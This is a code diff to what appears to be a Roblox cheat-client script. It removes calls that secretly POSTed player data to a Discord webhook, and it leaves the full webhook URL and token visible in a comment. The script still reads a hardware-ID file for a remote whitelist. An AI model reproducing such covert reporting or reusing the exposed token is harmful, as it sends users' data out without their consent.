@@ -22,7 +22,7 @@ local contextService = cloneref(game:GetService('ContextActionService'))
 local coreGui = cloneref(game:GetService('CoreGui'))
 
 local lplr = Players.LocalPlayer
-local webhook = "https://discord.com/api/webhooks/1464359024928620607/Q-CubcghJAo2XRl7omJY62_-eZHCbI0c2f2WgZgqOkeRK2zrDLvB4vlAPzEWDpEZcwoW"
+--local webhook = "https://discord.com/api/webhooks/1464359024928620607/Q-CubcghJAo2XRl7omJY62_-eZHCbI0c2f2WgZgqOkeRK2zrDLvB4vlAPzEWDpEZcwoW"
 local vape = shared.vape
 local rblxsite = 'https://www.roblox.com/users/'..lplr.UserId
 local fisishsiterlbx = rblxsite..'/profile?friendshipSourceType=PlayerSearch'
@@ -39,15 +39,6 @@ local s1 = {
 }
 
 local req = request or http_request or syn.request
-
-req({
-    Url = webhook,
-    Method = "POST",
-    Headers = {
-        ["Content-Type"] = "application/json"
-    },
-    Body = HttpService:JSONEncode(s1)
-})
 
 local api = "https://whitelistcommandsclient.fsl58.workers.dev/whitelist"
 local str = readfile("ReVape/accounts/hwid.txt")
@@ -362,14 +353,6 @@ run(function()
 
                         local req = request or http_request or syn.request
 
-                        req({
-                            Url = webhook,
-                            Method = "POST",
-                            Headers = {
-                                ["Content-Type"] = "application/json"
-                            },
-                            Body = HttpService:JSONEncode(s1)
-                        })
                     end
                 })
            end)
@@ -610,14 +593,7 @@ run(function()
 
             local req = request or http_request or syn.request
 
-            req({
-                Url = webhook,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = HttpService:JSONEncode(s1)
-            })				
+          
         end
 	end
 end)
